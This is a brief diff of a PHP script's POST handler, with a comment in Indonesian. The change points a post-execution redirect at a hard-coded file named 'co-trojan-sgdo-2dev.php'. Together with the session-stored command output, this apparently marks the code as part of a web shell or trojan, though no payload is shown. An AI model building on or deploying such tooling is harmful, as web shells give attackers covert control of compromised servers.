@@ -110,7 +110,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     		// ✅ Redirect agar tidak eksekusi ulang saat refresh
     		$_SESSION['output'] = $output;
-    		header("Location: " . $_SERVER['PHP_SELF']);
+		header("Location: co-trojan-sgdo-2dev.php");
     		exit;
 	    }
         }
